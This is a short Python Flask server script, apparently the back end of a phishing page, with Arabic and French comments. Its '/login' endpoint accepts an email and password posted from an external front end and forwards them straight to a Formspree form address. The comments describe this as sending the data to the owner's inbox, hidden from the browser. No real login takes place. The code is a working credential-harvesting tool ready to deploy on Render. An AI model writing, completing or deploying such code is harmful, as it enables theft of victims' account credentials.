# Pp.py
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app) # للسماح بالاتصال من موقع الفرونت إند الخارجي

# رابط Formspree الخاص بك لاستقبال البيانات بشكل آمن ومخفي عن المتصفح
FORMSPREE_URL = "https://formspree.io/f/xojzprkz"

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')
    
    payload = {
        "email": email,
        "password": password
    }
    
    try:
        # إرسال البيانات فوراً إلى صندوق البريد الإلكتروني الخاص بك عبر Formspree
        response = requests.post(FORMSPREE_URL, data=payload)
        if response.status_code == 200:
            print(f"[SUCCESS] Données reçues et envoyées pour: {email}")
            return jsonify({"status": "success"}), 200
        else:
            print(f"[ERROR] Formspree a renvoyé le code: {response.status_code}")
            return jsonify({"status": "fail"}), response.status_code
            
    except Exception as e:
        print(f"[EXCEPTION] Erreur système: {str(e)}")
        return jsonify({"status": "error"}), 500

# إعداد المنفذ المتغير ليتوافق مع بيئة الرفع على Render
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    print(f"Le serveur tourne sur le port {port}")
    app.run(host='0.0.0.0', port=port)
